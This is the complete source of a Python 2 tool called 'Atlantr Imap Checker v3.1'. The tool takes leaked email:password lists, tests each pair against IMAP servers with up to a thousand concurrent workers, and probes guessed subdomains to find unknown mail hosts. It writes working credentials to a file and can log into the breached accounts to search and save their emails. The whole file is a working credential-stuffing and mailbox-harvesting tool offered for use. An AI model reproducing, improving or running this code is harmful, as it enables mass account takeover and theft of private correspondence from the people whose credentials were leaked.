#!/usr/bin/python
#- * -coding: utf-8 - * -

# Author: sup3ria
# Version: 3.1
# Python Version: 2.7

import os
import time
from timeit import default_timer as timer
import imaplib
import itertools
import argparse
import signal
import socket
import compiler
import email
import errno
import shutil
import hashlib

import gevent  # pip install gevent
from gevent.queue import *
from gevent.event import Event
import gevent.monkey


def sub_worker(t):
    if evt.is_set():  # TODO: dirty!
        send_sentinals()
        return
    q_status.put(t[1])  # send status
    task = t[0].split(':')
    #-----------------------------------
    host = get_imapConfig(task[0])
    if not host:
        if scan_unknow_host:
            host = ini_uh(task[0])
        if not host:
            if invunma:
                q_unmatched.put(t[0])  # send unmatched to q
            return
    #-----------------------------------
    l = imap(task[0], task[1], host)
    if l == 'OK':
        q_valid.put(t[0])  # send valid to q
        q_status.put("VeryTrue")  # put True in q for progressbar
        #.........................
        if grabactiv:
            task = grabberwrap(task, host)
            return
    #----------------------------------
    if not l:
        if invunma:
            q_invalid.put(t[0])  # send to write to disk
        return

# main consumer thread


def worker(worker_id):
    try:
        while not evt.is_set():
            t = q.get(block=True, timeout=2)
            sub_worker(t)
        send_sentinals()
    except BaseException:
        send_sentinals()  # TODO: Not sure how to exit here

#-----------------WRAPPERS-------------------------#

# Gets message and forwards to queue


def grabberwrap(task, host):
    for q in loaded_matchers:
        try:
            e = email_grabber(task[0], task[1], host, q)
            qd = q.split('|')[2].strip()
            if len(e):
                # print "Found",len(e),"messages."
                # TODO: Implement Progressbar counter
                for mail in e:
                    q_grabbed.put((task, str(mail), qd))
        except BaseException:
            pass


#/-----------------WRAPPERS-------------------------#

#-----------------IMAP-------------------------#

# login via imap_ssl, uses imap query on all inboxes, returns emails
def email_grabber(a, b, host, q):
    if len(host) < 2:
        port = 993
    else:
        port = int(host[1])
    socket.setdefaulttimeout(time_out)
    quer = q.split('|')[0].strip()
    query = q.split('|')[1].strip()
    mail = imaplib.IMAP4_SSL(host[0], port)
    mail.login(a, b)
    rv, mailbox = mail.list()
    messages = []
    # TODO: Implement more stable filter for parsing mailboxes
    try:
        inboxes = [box.split(' ')[-1].replace('"', '') for box in mailbox
                   if box.split(' ')[-1].replace('"', '')[0].isalpha()]
    except BaseException:
        return []  # TODO: Weak errorhandling
    if len(inboxes) < 1:
        return
    for inbox in inboxes:
        try:
            # print inbox
            rv, data = mail.select(inbox)
            if rv == 'OK':
                result, data = mail.uid(quer, None, query)
                for uids in data[0].split():
                    rv, email_data = mail.uid('fetch', uids, '(RFC822)')
                    if rv != 'OK':
                        continue
                    raw_email = email_data[0][1]
                    raw_email_string = raw_email.decode('utf-8')
                    email_message = email.message_from_string(raw_email_string)
                    messages.append(str(email_message))
                    if grabb_perfor:
                        if len(messages>0):
                            return messages

                    #for part in email_message.walk():
                        #if part.get_content_type() == "text/plain":  # ignore attachments/html
                            #body = part.get_payload(decode=True)
                            #messages.append(str(body))
                            #if grabb_perfor:
                                #if len(messages>0):
                                    #return messages

                        #else:
                            #continue
        except BaseException:
            pass
    return messages

# log in via imap_ssl, gives back true if valid


def imap(usr, pw, host):
    socket.setdefaulttimeout(time_out)
    usr = usr.lower()
    try:
        if len(host) < 2:
            port = 993
        else:
            port = int(host[1])
        mail = imaplib.IMAP4_SSL(str(host[0]), port)
        a = str(mail.login(usr, pw))
        return a[2: 4]
    except imaplib.IMAP4.error:
        return False
    except BaseException:
        return "Error"

#/-----------------IMAP-------------------------#


#------GETUNKNOWN--HOST--------------------------#
def getunknown_imap(subb):
    socket.setdefaulttimeout(time_out)
    try:
        # TODO: Change to dynamic matchers
        sub = [
            'imap',
            'mail',
            'pop',
            'pop3',
            'imap-mail',
            'inbound',
            'mx',
            'imaps',
            'smtp',
            'm']
        for host in sub:
            host = host + '.' + subb
            try:
                mail = imaplib.IMAP4_SSL(str(host))
                mail.login('test', 'test')
            except imaplib.IMAP4.error:
                return host
    except BaseException:
        return None


def ini_uh(host):
    try:
        host = host.split('@')[1]
        v = getunknown_imap(host)
        if v is not None:
            with open("hoster.dat", "a") as myfile:
                myfile.write('\n' + host + ':' + v + ":993")
                ImapConfig[host] = v
            return v
        return False
    except BaseException:
        return False

#/------GETUNKNOWN--HOST--------------------------#

#---------------HELPERS-------------------------#


def make_sure_path_exists(path):
    try:
        os.makedirs(path)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise

# gets imap setting from dic


def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except BaseException:
        return False

# send sentinal values to writer queues


def send_sentinals():
    q_status.put("SENTINAL")
    q_valid.put("SENTINAL")
    if invunma:
        q_invalid.put("SENTINAL")
        q_unmatched.put("SENTINAL")
    if grabactiv:
        q_grabbed.put("SENTINAL")

# set event to trigger sential sending


def handler(signum, frame):
    print "\n[INFO]Shutting down gracefully (takes a while)"
    evt.set()

# read in blocks for better speed


def blocks(files, size=65536):
    while True:
        b = files.read(size)
        if not b:
            break
        yield b


def transform(expression):
    if isinstance(expression, compiler.transformer.Expression):
        return transform(expression.node)
    elif isinstance(expression, compiler.transformer.Tuple):
        return tuple(transform(item) for item in expression.nodes)
    elif isinstance(expression, compiler.transformer.Const):
        return expression.value
    elif isinstance(expression, compiler.transformer.Name):
        return None if expression.name == 'NIL' else expression.name

# get last line value from file generated when shutting down


def get_lastline():
    try:
        with open("last_line.log", "r") as text_file:
            for line in text_file:
                if int(line.strip()) < 1:
                    return 0
                else:
                    return int(line.strip())
    except BaseException:
        return 0

#/---------------HELPERS-------------------------#

#-----------LOADERS------------------------------#

# loading lines from file, putting them into q


def loader():
    try:
        global par1
        par1 = 0
        if resumer:
            par1 = get_lastline()
        with open(file_in, "r") as text_file:
            pid = par1
            for line in itertools.islice(text_file, par1, None):
                l = line.strip()
                if len(l) > 2:
                    ll = l.split(':')
                    if len(ll) < 3 and len(ll) > 1:
                        if len(ll[0]) and len(ll[1]):
                            la = ll[0].split('@')
                            if len(la) < 3 and len(la) > 1:
                                if len(la[1].split('.')) == 2:
                                    q.put((l, pid))
                                    pid = pid + 1

    except IOError:
        print "[ERROR]No input file", file_in, "found!"
    except BaseException:
        pass


# load imap queries from file #Yes, its racy and nobody cares ;-)
def init_matchers():
    global loaded_matchers
    loaded_matchers = []
    try:
        with open(file_match, "r") as text_file:
            loaded_matchers = [line.strip() for line in text_file
                               if len(line.strip()) > 1]
            if len(loaded_matchers) < 1:
                print "No matchers in", file_match
                grabactiv = False

    except BaseException:
        print "[ERROR] Could not load any matchers, no file provided."

# load Imap settings from file


def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    try:
        with open("hoster.dat", "r") as f:
            for line in f:
                if len(line) > 1:
                    hoster = line.strip().split(':')
                    ImapConfig[hoster[0]] = (hoster[1], hoster[2])
    except BaseException:
        print "[ERROR]hoster.dat", "not found!"

#/-----------LOADERS------------------------------#

#---------------WRITERS---------------------------#

# writing valid lines to disk


def writer_valid():
    try:
        with open(file_out, "a") as f:
            sen_count = workers
            while True:
                t = q_valid.get(block=True)
                if t == "SENTINAL":
                    sen_count -= 1
                    if sen_count < 1:
                        break
                else:
                    f.write(str(t) + "\n")
    except BaseException:
        pass

# writing invalid lines to disk


def writer_invalid():
    if invunma:
        try:
            with open(file_in[:-4] + "_invalid.txt", "a") as f:
                sen_count = workers
                while True:
                    t = q_invalid.get(block=True)
                    if t == "SENTINAL":
                        sen_count -= 1
                        if sen_count < 1:
                            break
                    else:
                        f.write(str(t) + "\n")
        except BaseException:
            pass

# writing unmachted lines to disk


def writer_unmatched():
    if invunma:
        try:
            with open(file_in[:-4] + "_unmatched.txt", "a") as f:
                sen_count = workers
                while True:
                    t = q_unmatched.get(block=True)
                    if t == "SENTINAL":
                        sen_count -= 1
                        if sen_count < 1:
                            break
                    else:
                        f.write(str(t) + "\n")
        except BaseException:
            pass

# writing grabbed emails to disk


def writer_grabber():
    if grabactiv:
        try:
            sen_count = workers
            while True:
                t = q_grabbed.get(block=True)
                if t == "SENTINAL":
                    sen_count -= 1
                    if sen_count < 1:
                        break
                else:
                    with open((file_in[:-4]+"_grabbed_" +str(t[2]) + ".txt"), "a") as ff:
                              ff.write(str(t[0][0])+":"+str(t[0][1])+"\n")
                    if grabb_perfor == False:
                        path = "grabbed_"+file_in[:-4]+"/"+str(t[2])+"/"+str(t[0])+"/"
                        make_sure_path_exists(path)
                        hash_object = hashlib.sha1(str(t[1]))
                        hex_dig = hash_object.hexdigest()
                        with open(path+str(hex_dig)+".elp", "w") as f:
                            f.write(str(t[1]))
                        # TODO: Performance is quite bad here
        except BaseException:
            pass

# getting line count and interating progressbar with it
# writing last line to file


def state():
    from tqdm import tqdm  # pip install tqdm
    sen_count = workers
    if not p_mode:
        with open(file_in, "r") as f:
            # TODO: Error when trailing \n/lines > 1
            line_max = sum(bl.count("\n") for bl in blocks(f))
        if par1 > line_max:
            first_line = line_max
        else:
            first_line = par1
        pbar = tqdm(total=line_max, ncols=80, initial=first_line)
    else:
        line_max = 99999999999999999  # pseudo inf.
        # TODO: Consider to use real inf.
        pbar = tqdm(ncols=80)
    pbar2 = tqdm(total=line_max, bar_format="  Valid: {n_fmt}")
    LastValue = {}
    while True:
        t = q_status.get(block=True)
        if t == "SENTINAL":
            sen_count -= 1
            if sen_count < 1:
                pbar.close()
                pbar2.close()
                try:
                    v = str(
                        int(max(LastValue.iteritems(), key=lambda x: x[1])[1]) + 1)
                except BaseException:
                    break
                try:
                    with open("last_line.log", "w") as f:
                        if line_max != par1:
                            f.write(v)
                except:
                    pass
                break
        else:
            if evt.is_set() is False:
                if t != "VeryTrue":
                    pbar.update()
                if t == "VeryTrue":
                    pbar2.update()
            if t != "VeryTrue":
                LastValue[t] = t

#/---------------WRITERS---------------------------#


# gevent async logic, spawning consumer greenlets
def asynchronous():
    threads = []
    threads.append(gevent.spawn(loader))
    for i in xrange(0, workers):
        threads.append(gevent.spawn(worker, i))
    threads.append(gevent.spawn(writer_valid))
    threads.append(gevent.spawn(state))
    if invunma:
        threads.append(gevent.spawn(writer_invalid))
        threads.append(gevent.spawn(writer_unmatched))
    if grabactiv:
        threads.append(gevent.spawn(writer_grabber))
    start = timer()
    gevent.joinall(threads)
    end = timer()
    #if grabactiv:
		#TODO: Reimplement snapshotting
        #if snap_shot:
            #if grabb_perfor == False:
                #output_filename = "grabbed_" + time.strftime("%Y%m%d-%H%M%S")
                #shutil.make_archive(output_filename, 'zip', "grabbed")
    print "[INFO]Time elapsed: " + str(end - start)[:5], "seconds."
    print "[INFO] Done."
    evt.set()  # cleaning up


print """
       db              88
      d88b       ,d    88                         ,d
     d8'`8b      88    88                         88
    d8'  `8b   MM88MMM 88 ,adPPYYba, 8b,dPPYba, MM88MMM 8b,dPPYba,
   d8YaaaaY8b    88    88 ""     `Y8 88P'   `"8a  88    88P'   "Y8
  d8""""""""8b   88    88 ,adPPPPP88 88       88  88    88
 d8'        `8b  88,   88 88,    ,88 88       88  88,   88
d8'          `8b "Y888 88 `"8bbdP"Y8 88       88  "Y888 88
     Imap checker v3.0                          by sup3ria
"""
parser = argparse.ArgumentParser(description='Atlantr Imap Checker v3.1')
parser.add_argument(
    '-i',
    '--input',
    help="Inputfile",
    required=False,
    type=str,
    default="mail_pass.txt")
parser.add_argument(
    '-o',
    '--output',
    help='Outputfile',
    required=False,
    type=str,
    default="mail_pass_valid.txt")
parser.add_argument(
    '-t',
    '--threads',
    help='Number of Greenlets spawned',
    required=False,
    type=int,
    default="1000")
parser.add_argument(
    '-iu',
    '--invunma',
    help='Log invalid an unmatched accounts.',
    required=False,
    type=bool,
    default=True)
parser.add_argument(
    '-g',
    '--grabber',
    help='Grab for matchers.',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-ga',
    '--grabball',
    help='Grabball emails',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-mf',
    '--matchfile',
    help='File with matchers..',
    required=False,
    type=str,
    default="matchers.dat")
parser.add_argument(
    '-to',
    '--timeout',
    help='timeout in sec',
    required=False,
    type=float,
    default="5")
parser.add_argument(
    '-r',
    '--resume',
    help='Resume from last line?',
    required=False,
    type=bool,
    default=False)
# Progressbar will be initialized by counting \n in a file,
# if file to big its too costly to count, hence disable when needed
parser.add_argument(
    '-b',
    '--big',
    help='Performance mode for big files',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-uh',
    '--unknownhosts',
    help='Check for unknown hosts',
    required=False,
    type=bool,
    default=True)
parser.add_argument(
    '-s',
    '--snap',
    help='Snapshots "Grabbed" folder as zip.',
    required=False,
    type=bool,
    default=False)

parser.add_argument(
    '-gper',
    '--grabperformance',
    help='Grabs but does not save emails',
    required=False,
    type=bool,
    default=False)


# parsing arguments
args = vars(parser.parse_args())

file_in = args['input']
file_out = args['output']
workers = args['threads']
invunma = args['invunma']
grabactiv = args['grabber']
file_match = args['matchfile']
time_out = args['timeout']
resumer = args['resume']
p_mode = args['big']
scan_unknow_host = args["unknownhosts"]
grabb_all = args["grabball"]
snap_shot = args["snap"]
grabb_perfor = args["grabperformance"]

# monkey patching libs which a supported by gevent

gevent.monkey.patch_all()

# registering an event and signal handler

evt = Event()
signal.signal(signal.SIGINT, handler)

# init ressources

init_ImapConfig()
if grabactiv:
    init_matchers()

# init of queues

q = gevent.queue.Queue(maxsize=250000)  # loader
q_valid = gevent.queue.Queue()  # valid
q_status = gevent.queue.Queue()  # status
if invunma:
    q_invalid = gevent.queue.Queue()  # invalid
    q_unmatched = gevent.queue.Queue()  # unmatched
if grabactiv:
    q_grabbed = gevent.queue.Queue()  # grabbed

# starting main logic

try:
    asynchronous()
except:
    pass #TODO: DIRTY! But it works to supress shutdown panic.
